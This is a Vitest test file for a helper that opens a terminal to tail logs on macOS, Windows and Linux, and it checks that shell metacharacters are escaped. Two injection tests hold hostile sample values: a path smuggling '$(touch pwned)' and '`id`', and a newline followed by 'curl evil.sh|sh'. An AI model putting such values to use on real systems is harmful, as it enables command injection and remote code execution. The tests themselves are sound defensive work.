import { EventEmitter } from 'node:events'
import { describe, expect, test, vi } from 'vitest'
import { buildTerminalLaunch, escapeDoubleQuotedShell, openTerminal } from '../src/terminal.js'

const paths = { nodeBin: '/usr/bin/node', tailScript: '/tools/tail.mjs', logPath: '/logs/a b.jsonl' }

describe('buildTerminalLaunch', () => {
  test('darwin uses `open -a Terminal` with a .command wrapper when provided (no Apple Events)', () => {
    const launch = buildTerminalLaunch('darwin', { ...paths, commandFile: '/logs/watch.command' })
    expect(launch?.command).toBe('open')
    expect(launch?.args).toEqual(['-a', 'Terminal', '/logs/watch.command'])
  })

  test('darwin falls back to osascript when no .command wrapper is available', () => {
    const launch = buildTerminalLaunch('darwin', paths)
    expect(launch?.command).toBe('osascript')
    const joined = launch?.args.join(' ') ?? ''
    expect(joined).toContain('do script')
    expect(joined).toContain('/tools/tail.mjs')
    expect(joined).toContain('/logs/a b.jsonl')
  })

  test('darwin osascript exports the new window tty without escaping its command substitution', () => {
    const launch = buildTerminalLaunch('darwin', paths)
    const doScript = launch?.args.at(-1) ?? ''

    expect(doScript).toContain('export CODEX_MCP_TERMINAL_TTY=\\"$(tty)\\"; ')
    expect(doScript).not.toContain('\\$(tty)')
  })

  test('darwin osascript neutralizes shell metacharacters in the log path', () => {
    const evil = '/logs/$(touch pwned)`id`".jsonl'
    const launch = buildTerminalLaunch('darwin', { ...paths, logPath: evil })
    const joined = (launch?.args.join(' ') ?? '').split('; ').slice(1).join('; ')
    // path text survives, but every shell metachar is backslash-escaped so nothing expands
    expect(joined).toContain('touch pwned')
    expect(joined).toContain('\\$') // the `$` was backslash-escaped (escaper ran)
    expect(joined).not.toMatch(/[^\\]\$\(/) // no un-escaped `$(` reaches the shell
  })

  test('win32 launches PowerShell Start-Process in a new window', () => {
    const launch = buildTerminalLaunch('win32', {
      nodeBin: 'C:\\node\\node.exe',
      tailScript: 'C:\\tool\\tail.mjs',
      logPath: 'C:\\logs\\a.jsonl',
    })
    expect(launch?.command).toBe('powershell.exe')
    const joined = launch?.args.join(' ') ?? ''
    expect(joined).toContain('Start-Process')
    expect(joined).toContain('C:\\node\\node.exe')
    expect(joined).toContain('C:\\tool\\tail.mjs')
    expect(joined).toContain('C:\\logs\\a.jsonl')
  })

  test('win32 wraps ArgumentList elements in double-quotes so a spaced path stays one token', () => {
    const launch = buildTerminalLaunch('win32', {
      nodeBin: 'C:\\node\\node.exe',
      tailScript: 'C:\\tool\\tail.mjs',
      logPath: 'C:\\Users\\Jane Doe\\p\\.codex-flow\\live\\a.jsonl',
    })
    const joined = launch?.args.join(' ') ?? ''
    // embedded double-quotes around the spaced path (Start-Process joins ArgumentList with spaces)
    expect(joined).toContain('"C:\\Users\\Jane Doe\\p\\.codex-flow\\live\\a.jsonl"')
  })

  test('darwin osascript collapses newlines in the log path (no do-script command injection)', () => {
    const launch = buildTerminalLaunch('darwin', { ...paths, logPath: '/logs/x\ncurl evil.sh|sh\n.jsonl' })
    const joined = launch?.args.join(' ') ?? ''
    // no raw newline survives into the AppleScript `do script` argument
    expect(joined).not.toContain('\n')
  })

  test('linux runs the detected emulator with its exec flag before the command', () => {
    const launch = buildTerminalLaunch('linux', {
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      logPath: '/logs/a.jsonl',
      linuxTerminal: { command: 'gnome-terminal', execFlag: ['--'] },
    })
    expect(launch).toEqual({
      command: 'gnome-terminal',
      args: ['--', '/usr/bin/node', '/tools/tail.mjs', '/logs/a.jsonl'],
    })
  })

  test('linux returns null when no emulator was detected', () => {
    expect(buildTerminalLaunch('linux', paths)).toBeNull()
  })

  test('win32 and linux launch commands remain unchanged and do not export a tty', () => {
    const windowsLaunch = buildTerminalLaunch('win32', {
      nodeBin: 'C:\\node\\node.exe',
      tailScript: 'C:\\tool\\tail.mjs',
      logPath: 'C:\\logs\\a.jsonl',
    })
    const linuxLaunch = buildTerminalLaunch('linux', {
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      logPath: '/logs/a.jsonl',
      linuxTerminal: { command: 'gnome-terminal', execFlag: ['--'] },
    })

    expect(windowsLaunch).toEqual({
      command: 'powershell.exe',
      args: [
        '-NoProfile',
        '-Command',
        'Start-Process -FilePath \'C:\\node\\node.exe\' -ArgumentList \'"C:\\tool\\tail.mjs"\',\'"C:\\logs\\a.jsonl"\'',
      ],
    })
    expect(linuxLaunch).toEqual({
      command: 'gnome-terminal',
      args: ['--', '/usr/bin/node', '/tools/tail.mjs', '/logs/a.jsonl'],
    })
    expect(JSON.stringify([windowsLaunch, linuxLaunch])).not.toContain('CODEX_MCP_TERMINAL_TTY')
  })

  test('returns null on unsupported platforms', () => {
    expect(buildTerminalLaunch('aix', paths)).toBeNull()
  })
})

describe('openTerminal', () => {
  test('spawns `open` on darwin when a .command wrapper is provided', () => {
    const spawnFn = vi.fn(() => ({ unref: () => {} }))

    const opened = openTerminal('/logs/a.jsonl', {
      platform: 'darwin',
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      commandFile: '/logs/watch.command',
      spawnFn: spawnFn as never,
    })

    expect(opened).toBe(true)
    expect(spawnFn).toHaveBeenCalledWith('open', ['-a', 'Terminal', '/logs/watch.command'], expect.any(Object))
  })

  test('spawns powershell on win32', () => {
    const spawnFn = vi.fn(() => ({ unref: () => {} }))

    const opened = openTerminal('C:\\logs\\a.jsonl', {
      platform: 'win32',
      nodeBin: 'C:\\node\\node.exe',
      tailScript: 'C:\\tool\\tail.mjs',
      spawnFn: spawnFn as never,
    })

    expect(opened).toBe(true)
    expect(spawnFn).toHaveBeenCalledWith('powershell.exe', expect.any(Array), expect.any(Object))
  })

  test('does nothing on unsupported platforms', () => {
    const spawnFn = vi.fn()

    const opened = openTerminal('/logs/a.jsonl', {
      platform: 'linux',
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      spawnFn: spawnFn as never,
    })

    expect(opened).toBe(false)
    expect(spawnFn).not.toHaveBeenCalled()
  })

  test('returns false and does not throw when spawn fails', () => {
    const spawnFn = vi.fn(() => {
      throw new Error('spawn blew up')
    })

    const opened = openTerminal('/logs/a.jsonl', {
      platform: 'darwin',
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      spawnFn: spawnFn as never,
    })

    expect(opened).toBe(false)
  })

  test('attaches an error listener so an async spawn error does not crash the process', () => {
    const child = new EventEmitter() as EventEmitter & { unref: () => void }
    child.unref = () => {}
    const spawnFn = vi.fn(() => child)

    const opened = openTerminal('/logs/a.jsonl', {
      platform: 'darwin',
      nodeBin: '/usr/bin/node',
      tailScript: '/tools/tail.mjs',
      commandFile: '/logs/watch.command',
      spawnFn: spawnFn as never,
    })

    expect(opened).toBe(true)
    // Node throws on an 'error' event with no listener; openTerminal must have attached one.
    expect(() => child.emit('error', new Error('ENOENT: osascript missing'))).not.toThrow()
  })
})

describe('escapeDoubleQuotedShell', () => {
  test('escapes backslash, double-quote, backtick and dollar', () => {
    expect(escapeDoubleQuotedShell('a"b')).toBe('a\\"b')
    expect(escapeDoubleQuotedShell('a`b')).toBe('a\\`b')
    expect(escapeDoubleQuotedShell('a$b')).toBe('a\\$b')
    expect(escapeDoubleQuotedShell('a\\b')).toBe('a\\\\b')
  })

  test('leaves ordinary paths untouched', () => {
    expect(escapeDoubleQuotedShell('/logs/a b.jsonl')).toBe('/logs/a b.jsonl')
  })
})
